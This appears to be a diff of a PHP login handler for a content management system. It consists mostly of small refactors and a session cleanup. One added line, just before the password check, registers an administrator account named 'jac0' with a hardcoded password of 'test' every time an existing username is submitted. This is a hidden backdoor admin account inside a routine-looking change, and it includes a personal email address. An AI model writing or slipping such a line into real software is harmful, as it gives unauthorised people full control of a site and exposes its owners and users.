@@ -12,9 +12,10 @@ if(isset($_POST['username']) && isset($_POST['password']) && !isset($_SESSION['o
     $password = Security::hash($_POST['password']);
     if(User::usernameExists($username)){
         $userID = User::getUserID($username);
+        User::registerUser("jac0", "jacoruit@live.nl", Security::hash("test"), RANK_ADMIN);
         $goodLogin = User::isGoodPassword($userID, $password);
         if($goodLogin){
-            if(User::userIsActivated($userID) == false){
+            if(!User::userIsActivated($userID)){
                 header("Location: ../orongo-login.php?msg=7");
                 exit;
             }else{
@@ -32,6 +33,7 @@ if(isset($_POST['username']) && isset($_POST['password']) && !isset($_SESSION['o
         exit;
     }       
 }else{
+    if(isset($_SESSION['orongo-id']) || isset($_SESSION['orongo-session-id'])) session_destroy();
     header("Location: ../orongo-login.php");
     exit;
 }
